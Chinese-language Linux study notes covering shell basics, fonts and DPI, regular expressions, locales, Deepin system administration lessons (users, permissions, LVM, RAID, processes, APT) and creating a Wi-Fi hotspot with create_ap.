Linux知识点总结的基础篇有相关图片说明。

帮助命令是Linux知识点总结的一部分，有对应图片。

文件与目录管理分为（一）和（二）两部分，均有图片。

权限管理是Linux知识点总结的第五部分，包含图片。

Vim文本编辑器是第六部分，有相关图片描述。

文件系统与文件查找为第七部分，包含图片。

系统管理是第八部分，有对应图片。

磁盘分区、逻辑卷和启动修复是第九部分，包含图片。

Shell篇认识BASH为第十部分，有图片描述。

Shell篇基础命令是第十一部分，包含图片。

文本操作篇为第十二部分，有两张相关图片。

标题：Shell
Shell俗称壳，是提供使用者使用界面的软件（命令解析器），是UNIX/Linux系统与外部的主要接口。

Shell在UNIX/Linux下的双重角色：管理用户与操作系统的交互；提供用户与操作系统通讯的方式（交互或非交互）。

Shell主要分为命令Shell和图形Shell。

图形Shell全名为Graphical User Interface shell（GUI shell），如Windows Explorer、Linux shell。

图形Shell分为窗口管理器和桌面环境。

常见窗口管理器有Compiz、KWin、I3、Xmonad等。

桌面环境自带一系列组件，提供完善软件需求和系统管理设置，如深度桌面环境、Gnome Shell、KDE等。

桌面环境必须使用窗口管理器，窗口管理器可单独运行。

命令Shell全名为Command Line Interface shell（CLI shell），是命令解释器，接收用户命令并调用应用程序。

常见命令Shell有bash、sh、ksh、csh（Unix/linux系统），COMMAND.COM（MS-DOS）等。

第一个Unix shell是肯·汤普逊仿效Multic上的shell实现的sh。

Bourne shell兼容的Shell包括Bourne shell (sh)、Almquist shell (ash)、Bash等。

命令Shell的命令补齐功能：输入命令前半部分，按Tab键自动补齐后半部分。

history命令格式：history [-c | -n]，-c清除全部历史，-n列出前n条命令。

alias命令定义别名：alias 别名=“原命令”，等号两端无空格，原命令用引号括起。

取消别名用unalias命令：unalias 命令别名。

井号(#)在Shell中常作为注释，位于行首或指令后，后面文字不执行。

~代表使用者的home目录，~+代表当前工作目录，~-代表上次工作目录。

分号(;)在Shell中作为命令分隔符，可连续执行多个命令。

单引号('')括住的内容视为单一字符串，变量$无作用；双引号("")允许变量扩展。

倒引号(``)内的内容视为命令，执行结果会被带入变量。

管道(|)连接上个指令的标准输出，作为下个指令的标准输入。

$符号用于变量替换，如echo $vrs显示变量vrs的值。

Shell变量分为局部变量、环境变量、位置变量、特殊形式的变量。

局部变量只在设定它的Shell中有效；环境变量在整个系统环境及子Shell中有效。

位置变量$0表示执行的程序名，$1至$9代表传给程序的参数，大于9的用${数字}。

$?表示最近一个执行过的命令的退出值，执行成功为0，失败为1。

&&表示前一个命令执行成功后才执行后一个命令；||表示前一个失败后执行后一个。

标题：内核
内核是一个操作系统的核心，具备操作系统的基本能力，包括内存管理、外设管理、资源管理、IO调度、系统调用的能力。

标题：字体
计算机字体（英语：computer font），简称字体（font），是包含有一套字形与字符的电子数据文件。

font是指某套具有同样样式、尺寸的字形；typeface则是一或多个font在一或多个尺寸的集合。

目前的字体大体可分为两类:点阵字体和矢量字体。点阵字体每种字形的每种形式和每种尺寸的图像都由点或者像素组成的矩阵构成，很难进行缩放，特定的点阵字体只能清晰地显示在相应的字号下，12-16px小汉字显示效果好，常见格式有bdf，pcf，fnt，hbf等。矢量字体使用贝塞尔曲线、绘图指令和数学公式描述每种字形，可适应各种尺寸。

Sans-serif=无衬线体=黑体；Serif=衬线体=白体；Monospace=等宽字体，字符宽度相同。以上均为字体类别，非具体字体。

常见字体类型：bdf和bdf.gz是点阵字体，“b”代表点阵，“d”代表布局，“f”代表形式，gzip压缩bdf；pcf和pcf.gz是点阵字体，“p”代表可移植，“c”代表编译，“f”代表字体，gzip压缩pcf；psf，psfu，psf.gz和psfu.gz是点阵字体，“s”代表屏幕，“f”代表字体，“U”代表Unicode，gzip压缩(不适用于X.Org)；pfa和pfb是矢量字体，“P”代表PostScript，“f”代表字体，“A”代表ASCII，“b”代表二进制，含内嵌打印令；ttf是outline，TrueType字体，PostScript字体替代；otf是outline，OpenType字体，带PostScript打印指令的TrueType字体。多数情况下TrueType和OpenType技术差异可忽略，部分ttf扩展字体实际是OpenType字体。

安装字体方法一：深度操作系统直接双击要安装的字体文件，出现预览和安装界面，双击“安装字体”(Install Font)即可。方法二：复制字体文件到/usr/share/fonts目录，终端执行sudo nautilus /usr/share/fonts，在弹出的文件管理器操作。方法三：终端安装文泉驿字体，执行sudo apt-get install xfonts-wqy。

字体文件存放路径：系统字体在/usr/share/fonts；用户字体在~/.local/share/fonts（~/.fonts已过时废弃）。字体配置文件路径：系统配置在/etc/fonts/fonts.conf；用户配置在~/.config/fontconfig/fonts.conf。用户配置优先级高于系统配置，建议用用户配置。

图形配置可安装gnome tweak tool，也可直接修改配置文件（文泉驿在线字体配置文件生成）。恢复默认字体设置可删除用户配置文件，终端执行rm -rf ~/.fonts.conf。

删除字体可直接到字体配置文件处删除不需要的字体。

标题：字体字号和dpi的关系
1pt=1/72in，1in=2.54cm，因此1pt≈0.3527mm。

初号对应42pt，小初号对应36pt，一号对应28pt，小四号对应12pt，五号对应10.5pt。

dpi即每英寸点数（dots per Inch），系统通过dpi反推显示器大小，计算每个pt对应的像素点px。

系统通过dpi计算pt对应的px，公式为px=pt*dpi/72。例如，12pt的小四号字体在96dpi下，px=12*96/72=16。

字体文件设计一般采用96dpi（windows系统默认值），系统会根据自身dpi与设计dpi计算实际显示的pt。

手机在20cm视距下，300dpi是乔布斯认为的视网膜屏；显示器在40cm视距下对应150dpi；电视机在120cm视距下对应50dpi。

dp单位用于统一不同设备的视觉体验，如手机12dp/2=6pt、电脑12dp/1=12pt、电视机12dp/0.33=36pt。

在debian+KDE中，获取当前dpi信息的命令：1. `xdpyinfo | grep men` 获取分辨率和尺寸；2. `xdpyinfo | grep reso` 获取dpi。

`xrandr --dpi 138` 可设置dpi（nvidia暂不支持），数值可通过分辨率除以尺寸（英寸，1英寸=2.54厘米）计算。

lightdm中，修改/etc/lightdm/lightdm.conf，将xserver-command修改为：xserver-command=X -dpi 138，可自动设置dpi。

nvidia显卡设置中，在Section "Screen"节添加`Option          "DPI" "138 x 138"`；在Section "Monitor"节添加`DisplaySize     707 398`（毫米）。

GTK/GNOME程序修正dpi需添加环境变量`export GDK_DPI_SCALE=1.4357`（138/96=1.4357），添加到/etc/profile或~.profile。

标题：正则表达式
正则表达式是对文本进行处理的工具，能用精简语言描述文本处理任务，是几乎所有编程语言和文本工具采用的标准文本处理方法。

linux中的正则表达式一般有两种：基本正则表达式、扩展正则表达式。

grep默认支持基本正则表达式，-E支持扩展，-P支持预查和回顾；sed支持基本，-r或-E支持扩展；awk支持扩展；perl、ruby、js全功能支持。

基本正则表达式中，.匹配单个字符；[]匹配括号范围内的单个字符；[^]匹配不在括号范围内的单个字符；[:name:]是预定义字符集合。

[:alnum:]表示数字和字母；[:alpha:]表示字母；[:upper:]表示大写字母；[:lower:]表示小写字母；[:blank:]表示空格和制表符。

基本正则表达式中，*匹配0到n次（贪婪模式）；\?匹配0到1次；\+匹配1到n次；\{x\}匹配x次；\{x,y\}匹配至少x次最多y次。

基本正则表达式中，^表示行首；$表示行尾（如^$匹配空行）；\<表示单词词首；\>表示单词词尾。

基本正则表达式中，\(str\)是正则分组；\1引用第一个分组结果；\&引用前面所有分组结果。

扩展正则表达式中，?、+、{x}、()不用转义；|表示或。

正向预查和回顾查找是扩展功能。msg(?=str)为正向预查，msg之后是str才匹配msg；(?<=str)msg为回顾查找，msg之前是str才匹配msg。

标题：系统语言
locale中文译为地区或地域，在linux上用于定义用户使用的语言及相关语言环境，还定义用户使用的字符集，对含非ASCII字符的语言很重要。

Locales格式为<lang>_<territory>.<codeset>[@<modifiers>]，涉及用户语言符号、数字、排序等多方面文化传统分类。

列出所有启用的locale，终端执行locale -a；显示正在使用的locale，终端执行locale。

配置中文local环境第一步：编辑/var/lib/locales/supported.d/local，写入如zh_CN.UTF-8 UTF-8等内容。

配置中文local环境第二步：生成相关locales，终端执行sudo locale-gen --purge。

配置中文local环境第三步：编辑/etc/default/locale，写入LANG等相关内容，重启电脑生效。

TTY下中文默认乱码，可使用Fbterm解决。

LC_CTYPE定义用户使用的语言符号及其分类，LC_NUMERIC与数字相关。

LC_TIME关乎时间显示格式，LC_MONETARY与货币单位有关。

LC_MESSAGES包含提示信息、错误信息等，LC_PAPER与默认纸张尺寸相关。

标题：Deepin运维教程-L5
grep用于查找文件中符合条件的字符串，命令格式：grep [-选项] "查找条件" 目标文件。常用选项：-n（行号）、-i（忽略大小写）、-v（排除匹配行）。

grep常用正则表达式：^字符串（以该字符串开头的行）、$字符串（以该字符串结尾的行）、^$（空行）。

find命令根据预设条件递归查找文件或目录，格式：find 查找路径 查找条件 [-exec 处理命令 {} \; ]。常用条件：-type（f文件、d目录、l链接）、-name（文件名）、-size（大小，+大于、-小于）。

Linux压缩格式及工具：gzip→.gz、bzip2→.bz2、xz→.xz。压缩命令格式：gzip [选项] 文件名，-d为解压缩选项。

tar命令用于打包，格式：tar 选项 压缩包名 被压缩文件。常用选项：-c（创建）、-f（指定文件名）、-z（gzip）、-j（bzip2）、-J（xz）、-x（释放）、-C（指定解压路径）。

MBR分区格式：最多4个主分区，支持最大2.2T磁盘容量。GPT分区格式：可划分128个主分区，最大支持18EB容量。

CentOS5默认文件系统ext3，CentOS6默认ext4，CentOS7默认xfs。xfs支持单个文件系统最大8EB，单个文件最大500TB。

mount命令用于挂载文件系统，格式：mount 设备路径 挂载点目录。umount用于卸载，格式：umount 挂载点目录。

/etc/fstab用于存放文件系统信息，系统启动时自动挂载。文件含6个字段：设备路径、挂载点、文件系统类型、挂载参数、备份标识、检查顺序。

LVM创建步骤：创建卷组（vgcreate 卷组名 设备）、创建逻辑卷（lvcreate -L 大小 -n 逻辑卷名 卷组名）、格式化、挂载。扩展逻辑卷用lvextend，扩展文件系统用xfs_growfs（xfs）。

标题：Deepin运维教程-L6
逻辑卷的删除不允许联机操作，需要先卸载，再执行删除。执行删除操作时，首先删除LV逻辑卷，再删除VG卷组，最后删除PV物理卷。删除命令：lvremove。

逻辑卷的缩减使用命令lvreduce，不允许联机缩减，需先缩减文件系统的空间，再缩减逻辑卷的空间。

RAID中文全称：独立磁盘冗余阵列，简称磁盘阵列。可通过软件/硬件技术将多个独立磁盘整合成一个逻辑磁盘，提高数据I/O速度和冗余功能。

RAID0：等量存储，至少由2块磁盘组成，同一个文档等量存放在不同的磁盘并行写入数据来提高效率，无冗余功能，一块盘故障数据丢失，不适合重要数据。

RAID1：完整备份，至少由2块磁盘组成，同一个文档复制成多份存储到不同磁盘提高可靠性，读写速度没有提升，适合存储重要的数据。

RAID5：至少由3块磁盘组成，同一份文档分散写入不同磁盘，每个硬盘都有校验数据，校验数据占用磁盘三分之一空间，三分之二存原始数据，允许同时坏一块磁盘，可通过其他磁盘和校验信息恢复数据。

RAID10=RAID1+RAID0，最少需要4块磁盘，先组成两组RAID1，再组成RAID0，提高读写速度和数据安全性，可用容量是总容量的一半。

实现RAID的三种方式：软件技术实现（软RAID）；外接式磁盘阵列柜（大型服务器，昂贵）；RAID磁盘阵列卡（硬RAID，更安全稳定，带缓存和电池）。

程序：计算机语言编写的命令序列集合，实现特定目标，占用磁盘空间，静态永久。进程：运行中的程序，占用内存，动态有生命周期，有PID，有父进程，分前后台。线程：轻量级进程，进程的子集，共享内存，切换快开销小。

pstree以树状结构显示进程信息及进程间关系，常用选项：-p显示PID，-a显示完整命令行，-u列出所属账号。

ps aux：unix格式静态查看所有进程，a显示当前终端进程，u用户格式，x当前用户所有终端进程。ps -ef：Linux格式静态查看所有进程，e显示所有进程，l长格式，f完整信息。

top动态查看系统性能，-d指定刷新秒数。交互指令：P按CPU排序，M按内存排序，q退出。

pgrep通过程序名匹配进程，选项：-l输出进程名与PID，-U检索指定用户进程，-t检索指定终端进程，-x精确匹配。

进程前后台调度：&将进程放入后台；jobs -l查看后台进程；fg 进程编号调至前台；ctrl+z挂起至后台；bg 进程编号激活后台挂起进程。

杀死进程方式：ctrl+c结束当前程序；kill -9强制杀死进程；killall -9 进程名强制杀死进程；pkill -9 进程名强制杀死进程。

用户登录分析：users、who、w查看登录用户（详细度不同）；last显示登录成功用户；lastb显示登录失败用户。

Linux软件包分为源码包和二进制包（RPM包）。

源码包缺点：安装麻烦，需手动编译，解决依赖；优点：源代码开放，可二次开发，安装灵活，卸载方便。

RPM包缺点：功能不可自定义，安装不灵活，不可见源码；优点：已编译，安装简单快速。命名规则包含名称、版本、补丁次数、适合系统、CPU架构、扩展名。

rpm命令管理软件包，常用选项：-q查询是否安装，-qa列出所有安装软件，-ivh安装，-e卸载，--import导入签名。

标题：Deepin用Create_ap建热点
使用Create_ap可在Deepin系统用网卡建立虚拟wifi热点，无需路由器即可使用WiFi。

创建create_ap.sh脚本的步骤：创建txt文本，复制代码，修改名称为“create_ap.sh”，右键属性勾选“允许以程序执行”。

打开create_ap.sh脚本需双击，选择“在终端中运行”。

脚本会查询网络接口，包括无线网卡接口（以wl开头）、有线网卡接口（以en开头）、宽带接口（以ppp开头）。

检查网卡是否支持AP模式：查看sudo iw list|grep -E "^* AP$"是否有“* AP”字样，也可访问http://wireless.kernel.org/en/users/Drivers查询。

安装create_ap需先安装hostapd、dnsmasq、haveged、iptables和git，再通过git clone https://github.com/oblique/create_ap获取源码并sudo make install。

建AP时不可用的信道可通过sudo iw list|grep "(no IR)"|cut -d' ' -f4和sudo iw list|grep "(disabled)"|cut -d' ' -f4查询。

开启Wan-->AP的命令为sudo create_ap $wan $wan Deepin_AP 123456789 &。

开启Lan-->AP的命令为sudo create_ap $wan $lan Deepin_AP 123456789 &。

开启ppp-->AP的命令为sudo create_ap $wan $ppp Deepin_AP 123456789 &。

关闭AP的命令为sudo create_ap --stop $wan。

无密码开放网络的create_ap示例命令：create_ap wlan0 eth0 MyAccessPoint。

WPA + WPA2密码的create_ap示例命令：create_ap wlan0 eth0 MyAccessPoint MyPassPhrase。

AP无Internet访问的create_ap示例命令：create_ap -n wlan0 MyAccessPoint MyPassPhrase。

桥接共享Internet的create_ap示例命令：create_ap -m bridge wlan0 eth0 MyAccessPoint MyPassPhrase。

同一WiFi接口共享Internet的create_ap示例命令：create_ap wlan0 wlan0 MyAccessPoint MyPassPhrase。

选择不同WiFi适配器驱动的create_ap示例命令：create_ap --driver rtl871xdrv wlan0 eth0 MyAccessPoint MyPassPhrase。

启用IEEE 802.11n的create_ap示例命令：create_ap --ieee80211n --ht_capab '[HT40+]' wlan0 eth0 MyAccessPoint MyPassPhrase。

Client Isolation的create_ap示例命令：create_ap --isolate-clients wlan0 eth0 MyAccessPoint MyPassPhrase。

启动create_ap系统服务的命令：systemctl start create_ap；开机自启命令：systemctl enable create_ap。

网络接口与网卡不同，网卡是物理硬件，网络接口是虚拟的，多数时候一个网络接口对应一个网卡，如宽带连接、VPN、AP都是虚拟网络接口。

使用有线网络接口上网却选择共享无线网络接口，用sudo create_ap wlp8s0b1 wlp8s0b1 Deepin_AP 123456789命令会出错，应使用create_ap wlan0 eth0 MyAccessPoint MyPassPhrase。

标题：创建wifi热点
采用github上的create_ap项目创建wifi热点简单省事。

安装create_ap：若有git，克隆安装；若无git，先安装git。

安装git的命令：sudo apt-get install git

create_ap依赖hostapd、iptables、dnsmasq，需先安装。

安装create_ap依赖程序的命令：sudo apt-get install hostapd iptables dnsmasq

无线网卡wlan0、有线网卡eth0时，创建名为myhost、密码12345678的热点，可直接运行或后台运行create_ap命令。

查看网卡名可用ifconfig或特定awk命令。

卸载create_ap：需有项目文件或Makefile，执行make uninstall。

使用ap-hotspot需添加ppa源：sudo add-apt-repository ppa:nilarimogard/webupd8

无add-apt-repository命令时，先安装python-software-properties和software-properties-common。

安装ap-hotspot：添加ppa源后更新并安装。

使用ap-hotspot：先配置，再开启。

卸载ap-hotspot：卸载程序并删除ppa源，不建议删除python软件配置。

标题：Deepin系统运维
Deepin中，Super + S可切换工作区，工作区横向排列，无多行自适应布局。Super键即Windows键，该快捷键源自Ubuntu。

Super键功能：启动器（Super）；显示工作区（Super + S）；当前工作区窗口（Super + W）；所有工作区窗口（Super + A）；显示桌面（Super + D）；文件管理器（Super + E）；锁屏（Super + L）。

Deepin启动器搜索支持拼音，输入“xk”可显示“显卡驱动管理器”，支持简拼、全拼和模糊匹配。

Deepin中，控制中心-鼠标开启“自然滚动”，可使笔记本触控板双指滚动与手机、平板、macOS、Win10一致。

Chrome可右键去掉“使用系统标题栏和边框”；VSCode在“文件-首选项-设置-窗口-Title Bar Style”选custom，以使用自定义标题栏。

安装VSCode后，Chrome下载文件点击“在文件夹中显示”弹出VSCode，解决方法：文件管理器建空文件夹，右键“打开方式”设“文件管理器”为默认。

搜狗输入法有内存泄露，建议换fcitx。卸载：sudo apt purge sogoupinyin，注销或重启，killall fcitx，pgrep fcitx无输出后删配置，安装：sudo apt install fcitx-googlepinyin fcitx-ui-classic，启动fcitx-autostart。

应用商店卸载软件失败，可Ctrl + Alt + T打开终端，执行sudo apt install -f后重新卸载。

修改文件扩展名：方法一，文件管理器右键“属性”修改；方法二，终端执行sudo mv filename.txt filename。

系统快照用Timeshift，从应用商店安装。位置选/和/home外分区，用户选“包含隐藏文件”，筛选列表排除部分目录。第一次快照全备份，后续用软链接。命令行查看：sudo timeshift --list，还原：sudo timeshift --restore。

删除不需要的文件打开方式：文件管理器进主目录，Ctrl + H显示隐藏文件，进入.config目录，编辑mimeapps.list。

ShadowSocks代理：手动代理设SOCKS代理“127.0.0.1”，端口“1080”；自动代理配置URL“file:///homeloaden/.ss.pac”，需安装python3-pip和genpac生成pac文件。

启动器隐藏启动项：文件管理器进/usr/share/applications，右键“管理员身份打开”，编辑不想看的启动项，添加NoDisplay=true。

创建“我的世界”启动项：在~/.local/share/applications建Minecraft.desktop，内容含Categories、Comment、Exec、Icon等，Exec用绝对路径，Icon放~/.local/share/icons/hicolor各尺寸目录。启动脚本Minecraft.sh含cd路径和java -jar HMCL.jar，需装default-jre和openjfx。

VirtualBox支持USB2.0/3.0：安装扩展sudo apt install virtualbox-extension-pack，添加用户组sudo adduser loaden vboxusers，重启生效，查看用户组groups loaden。

VirtualBox虚拟机减肥：关休眠powercfg /h off，关系统还原，磁盘碎片整理，用sdelete -c -z C: D:，关虚拟机后执行VBoxManage modifyhd --compact WINXP.vdi。

更换主机名：sudo deepin-editor /etc/hostname，替换后重启生效。

查找命令路径用which，如which deepin-editor；查文件所属包用dpkg -S，如dpkg -S /usr/bin/deepin-editor。

APT命令：查找软件apt search；重装sudo apt install --reinstall；安装修复依赖sudo apt install -f；卸载清配置sudo apt purge；自动卸载清配置sudo apt autoremove --purge。

批量编码转换：装libav-tools，建conv.sh设可执行，脚本含循环用avconv转换.mov为.mp4，成功后删原文件。

硬盘克隆推荐Clonezilla，dd命令备用：备份sudo dd if=/dev/sda1 of=~/elf.bak status=progress，还原sudo dd if=~/elf.bak of=/dev/sda1 status=progress。

备份MBR：sudo dd if=/dev/sdX of=/path/to/mbr bs=512 count=1；还原：sudo dd if=/path/to/mbr of=/dev/sdX bs=512 count=1；备份分区表sudo sfdisk -d /dev/sdX  /path/to/fqb。

解决与Windows时间不同步：sudo dpkg-reconfigure tzdata设时区，sudo hwclock --localtime --systohc写本地时间；或timedatectl set-local-rtc 1 --adjust-system-clock。

删除旧内核：查所有内核dpkg --get-selections | grep linux，查正在使用的uname -r，删除不用的sudo apt purge XXX。

清除已卸载软件遗留配置:dpkg --get-selections | grep deinstall | sed 's/deinstall/lpurge/' | sudo dpkg --set-selections; sudo dpkg -Pa。

开机进命令行：sudo systemctl disable lightdm；恢复进桌面：sudo systemctl enable lightdm。

系统启动分析：systemd-analyze显示用户态和内核态时间；systemd-analyze blame显示各启动项耗时。

系统假死后安全重启：Alt + SysRq + B，SysRq即Print Screen键，有Fn键可能需同时按。

进程相关命令：pgrep XXX查进程ID；ps -ef |grep XXX显示进程及命令行；pkill XXX杀掉进程；killall XXX全杀。

Live模式修复GRUB引导：终端执行sudo -i && fdisk -l找sdaX，挂载相关分区，chroot /mnt，update-grub，grub-install /dev/sda，exit。

离线安装软件：有网电脑下载软件及依赖，脱机电脑sudo dpkg -i *.deb，报错则sudo apt install -f，缺依赖用apt download XXX下载。

制作USB启动盘：sudo dd if=/path/to/iso of=/path/to/USB status=progress。

查看UUID：blkid或ls -l /dev/disk/by-uuid；同步编辑/etc/fstab。

配置默认Python版本：用update-alternatives，添加选项sudo update-alternatives --install ...，切换sudo update-alternatives --config python。

标题：Deepin运维教程-L1
[root@localhost ~]# 中，root是当前用户名，localhost是主机名，~是当前所在家目录，#表示当前用户是超级管理员；普通用户提示符为$，家目录为/home/用户名。

Linux是多用户、多任务系统，严格区分大小写，一切皆文件，目录/文件以树形结构存在于根目录“/”下，无扩展名，无提示常表示操作成功。

命令行编辑技巧：上下键调历史命令；Ctrl+C取消当前命令；Ctrl+L清屏；Tab自动补齐；Ctrl+A移光标到行首；Ctrl+E移到行尾；Ctrl+U清空至行首；Ctrl+W删除一个单词；exit退出系统。

Linux命令一般格式：命令字 [-选项...] [参数...]。选项分短选项（如-l、-a，可合并）和长选项（如--help，不可合并）；参数是命令执行对象。

Linux中目录与文件颜色标识：蓝色为目录，白色为文件，浅蓝色为链接文件，绿色为可执行文件，红色为压缩文件，黄色为设备文件，红色闪动为不可用链接文件。

ls命令用于查看目录/文件内容及属性，常用选项：-a显示所有内容（含隐藏），-l长格式显示详细属性，-h人性化显示大小，-d仅显示目录本身，-i查看inode号，-R递归查看。

Linux文件类型标识：-表示文件，d表示目录，l表示链接文件，b表示跨设备文件，c表示字符设备文件，p表示管道设备文件，s表示套接字。

Linux文件归属关系分三类：u（所有者，权限最大）、g（所属组，权限次之）、o（其他人，权限最小）。

mkdir命令用于创建目录，格式：mkdir [-选项] 目录名，常用选项-p递归创建多个目录；目录/文件名不能含“/”，长度不超255字符。

cd命令用于切换目录，格式：cd [-选项] [目录名]。~表示家目录，.表示当前目录，..表示上一级目录，-可在两路径间切换；不指定目录则切换到当前用户家目录。

pwd命令用于打印当前所在工作目录的绝对路径，格式：pwd [-选项]。

绝对路径以“/”（根）为起点；相对路径以当前路径为起点。

rmdir命令用于删除空目录，格式：rmdir [-选项] 目录名，只能删除空目录，目录非空则无法删除。

touch命令用于创建新的空白文件，格式：touch [-选项] 文件名，可同时创建多个文件，存在同名文件时不会覆盖。

cp命令用于复制文件或目录，格式：cp [-选项] 源文件或目录 目标目录。常用选项：-p保留源文件属性，-r复制目录（含子目录和文件），复制时可修改名称。

mv命令用于移动文件或目录到其他位置，也可修改名称，格式：mv [-选项] 源文件... 目标路径，可同时移动多个文件或目录。

cat命令用于查看文本文件内容，格式：cat [选项] 文件名，常用选项-n以行号形式显示内容。

less工具分页显示文件输出，格式：less [-选项] 文件，选项-N以行号显示；可上下键逐行查看，PgDn/PgUp翻页，/字符串搜索，G到末尾，gg到行首，q退出。

head命令显示文件开头部分内容，默认10行，选项-n<行数>指定行数；tail命令显示文件末尾部分内容，默认10行，选项-n<行数>指定行数，-f动态显示。

rm命令用于删除文件或目录，格式：rm [-选项…] 目录或文件…。选项：-f强制删除（无需确认），-r删除目录；“*”代表任意字符。

软连接类似快捷方式，可跨分区，可链接目录，源文件删除后链接不可用；命令：ln -s 源文件绝对路径 目标路径。

硬连接不可跨分区，不可链接目录，源文件删除后链接仍可用；命令：ln 源文件路径 目标路径，硬连接文件inode号相同。

标题：Deepin运维教程-L2
命令是实现某功能的指令或程序，依赖解释器（如/bin/bash），/etc/shells存可用shell。which命令用于搜索命令的绝对路径。

Linux命令分内部命令（shell自带）和外部命令（独立可执行文件）。type用于区分两者，which查找外部命令位置。$PATH存shell查找路径，hash记录外部命令路径缓存。

help命令查看shell内部命令帮助，格式为help [选项] 命令，无法获取外部命令帮助。外部命令可用--help查看帮助。

man命令查看系统命令详细帮助，格式为man [-选项] 命令。常用操作：上下键移行，Page Down/Up翻页，/关键字搜索（n向下，N向上），q退出。

Linux有7个运行级别：0关机，1单用户模式，2多用户（无NFS），3完全多用户，4未使用，5带GUI，6重启。runlevel查看当前级别，systemctl get-default看默认级别，set-default修改默认。

关机命令：init 0、halt、poweroff、shutdown -h now（立刻）、shutdown -h 10（10分钟后）。重启命令：reboot、shutdown -r now、shutdown -r 10。

软连接特点：可跨分区，可链接目录，源文件删除后不可用。硬连接：不可跨分区，不可链接目录，源文件删除后仍可用。ln -s创建软连接，ln创建硬连接。

/是根目录，所有数据存放于此。/bin存必备可执行程序，/boot存内核及引导文件，/etc存配置文件，/root是管理员家目录，/home是普通用户家目录。

uname命令显示内核信息，-s显示内核名称，-r显示内核版本。/proc/cpuinfo存CPU信息，lscpu显示CPU架构信息。

/proc/meminfo存内存信息，free命令查看内存使用，-h选项以人类易读方式显示（KB、MB、GB）。

网卡配置文件在/etc/sysconfig/network-scripts/网卡名，ifconfig命令显示和设置网卡参数，可指定网卡名查看其信息。

/etc/hostname存主机名，hostname命令显示和设置主机名，hostnamectl set-hostname可永久修改主机名（立即生效）。

标题：Deepin运维教程-L3
vi/vim分为三种模式：命令模式、输入模式、底线命令模式（末行模式）。

命令模式下按a/i/o进入输入模式，i在当前光标前插入，a在当前光标后插入，o在当前行下插入新行。

底线命令模式下，:w保存，:q退出，:wq保存并退出，:q!强制退出不保存。

网卡配置文件地址：/etc/sysconfig/network-scripts/网卡名。

重启网络用systemctl restart network，启动网卡用ifup 网卡名，禁用网卡用ifdown 网卡名。

nmcli修改IP：nmcli connection modify 网卡名 ipv4.method manual ipv4.addresses Ip地址/掩码 connection.autoconnect yes，激活用nmcli connection up 网卡名。

host命令用于将一个域名解析到一个IP地址。

nslookup用于查询域名解析是否正常，诊断网络问题。

alias设置命令别名，格式：alias 别名=命令（等号前后无空格），.bashrc存放别名，unalias 别名取消别名。

history显示历史命令，-a追加新命令到历史文件，-d删除指定命令，-c清空历史列表；!#调用第N条命令，!string调用以string开头的命令，!!重复上一条。

date显示或设置系统时间，+%Y显示年份，+%F显示年-月-日，-s设置时间；hwclock -s将系统时间设为与硬件时间相同，-w则相反。

wc统计文件字节数、行数，-c统计字节数，-l统计行数。

管道符“|”将命令输出交给另一条命令处理。

重定向符号：>覆盖输出，>>追加输出，2>收集错误输出，&>收集正确和错误输出。

echo输出字符串和变量，sleep延迟一段时间，单位有s（秒）、m（分钟）等。

标题：Deepin运维教程-L4
用户账号可用来登录系统，实现访问控制；用户模板目录为/etc/skel/

useradd命令用于创建新用户，格式为useradd [-选项] 用户名，常用选项包括-u（指定UID）、-d（指定家目录）等

id命令用于查看系统用户和用户所在组的信息，格式为id [-选项] [用户名]

用户基本信息存放在/etc/passwd文件，字段含义：用户名:密码占位符:UID:基本组GID:描述信息:家目录:解释器程序

UID分类：0为超级用户，1-499为系统伪用户（不能登录，无家目录），500-65535为普通用户

/etc/default/useradd存放用户默认值信息，包括GROUP、HOME、SHELL等

/var/spool/mail/是用户邮件目录

passwd命令用于设置用户密码，格式为passwd [-选项] [用户名]，-l选项用于锁定用户密码

非交互设置用户密码格式：echo "密码" | passwd --stdin 用户名

用户密码信息存放在/etc/shadow文件，默认任何人无权限（除root）

su命令用于切换用户身份，格式为su [-选项] [用户名]，-选项可连同环境一起切换

usermod用于修改用户属性，格式为usermod [-选项] 用户名，-u选项修改用户UID

userdel用于删除用户，-r选项删除用户及相关文件（包括家目录）

groupadd用于创建新工作组，格式为groupadd [-选项] 组名，-g指定组的GID

组信息存放在/etc/group文件，字段含义：组名:组密码占位符:GID:组中附加用户

组密码信息存放在/etc/gshadow文件

groupmod用于修改组属性，-g修改组的GID，-n修改组名

gpasswd用于管理组，-a将用户添加到组，-d将用户从组中删除

groupdel用于删除指定工作组，格式为groupdel 组名

chmod设置文件权限，归属关系u（所有者）、g（所属组）、o（其他人），权限r（4）、w（2）、x（1）

umask用于显示或设置创建文件的权限掩码，格式为umask [-p] [-S] [mode]

chown设置文件所有者和所属组，格式包括chown 所有者:所属组 文档，-R递归修改

SetUID使普通用户执行文件时临时拥有所有者身份，设置命令chmod u+s 文件名

对目录设置SetGID后，普通用户在该目录下创建的文件所属组与目录所属组相同

Sticky BIT针对目录，普通用户只能删除自己创建的文件，设置命令chmod o+t 目录名

FACL为用户定制权限，setfacl -m设置权限，-x删除指定用户权限

Linux通配符：*代表任意多个字符，?代表任意单个字符

标题：GTK
GTK，即 GIMP Toolkit，最初由 GNU项目为 GIMP 开发，现在是流行工具包，绑定多种语言。

GTK 3 和 GTK 4 的默认主题是 Adwaita，还有 HighContrast 和 HighContrastInverse 主题。GTK 2 的默认主题是 Raleigh。

强制使用特殊主题可设置环境变量：GTK 3 和 4 用 GTK_THEME，如 GTK_THEME=Adwaita:dark gnome-calculator；GTK 2 用 GTK2_RC_FILES，如 GTK2_RC_FILES=/usr/share/themes/Raleigh/gtk-2.0/gtkrc gimp。

主题文件一般解压在 ~/.themes/ 或 ~/.local/share/themes/ 目录。

同时安装GTK和QT程序，外观不协调，可参考Uniform look for Qt and GTK applications。

标题：linux apt 源系统介绍
linux用户安装程序的方式：一、下载独立安装程序如.deb包；二、使用在线软件仓库，debian系中为apt工具。

apt使用gpg验证源的安全和稳定，基于公钥私钥体系。第三方源需下载对应key并安装进apt系统。

安装gpg的命令：sudo apt install gnupg；安装key的命令：sudo apt-key add this.key。

编辑源地址可通过：sudo nano -w /etc/apt/sources.list 或在/etc/apt/sources.list.d/添加新.list文件。

仓库地址deb http://mirrors.tuna.tsinghua.edu.cn/deepin panda main contrib non-free中，deb表示二进制包，panda是发行版，main等是子仓库。

仓库信息在/dists/发行版/Release文件中，可用apt policy获取，包括origin、label、suite等信息。

deepin基于debian，其unstable（panda）对应debian的unstable，stable（lion）对应debian的stable，无testing版。

apt工作流程：读取源地址处理依赖，下载包到/var/cache/apt/archives/，仓库软件信息在/var/lib/apt/lists/。

